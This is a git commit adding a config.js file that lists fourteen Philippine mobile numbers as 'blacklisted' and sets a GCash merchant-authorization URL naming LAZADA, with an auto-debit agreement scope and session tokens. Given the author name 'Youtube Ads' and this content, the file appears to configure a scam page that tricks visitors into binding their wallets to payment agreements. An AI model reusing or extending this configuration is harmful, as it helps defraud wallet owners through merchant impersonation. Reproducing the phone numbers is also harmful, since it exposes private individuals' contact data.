2311e836001ff0553d317c0be0406049bfe598d5
Youtube Ads <cashonvids@gmail.com>
2026-03-28 04:09:46 +0800

    Create config.js

---
+++ js/config.js
@@ -0,0 +1,19 @@
+// config.js
+window.BLACKLISTED_NUMBERS = [   
+    '09922378466', 
+    '09104932331',
+    '09913601270',
+    '09075106763',
+    '09678361905',
+    '09266950122',
+'09851217895',
+'09678712623',
+'09263709598',
+'09773767400',
+'09273178057',
+'09481456482',
+    '09093961964',
+    '09264008526'
+];
+
+window.LATEST_GCASH_URL = "https://m.gcash.com/gcashapp/gcash-merchants-auth/index.html?acqSiteId=2071216300000000&clientId=2018062511204800000679&merchantId=2163400000000013&merchantName=LAZADA&netAuthId=2026032719074400000310018313955&paySiteId=1022170000000000000&redirectUrl=https://open-ph.alipay.com/api/alipay/channel/gn/gcashmini/binding-callback.htm&scopes=AUTH_AGREEMENTPAY&state=2026032719031313002501449287880&terminalType=WEB&signature=$sign#/"
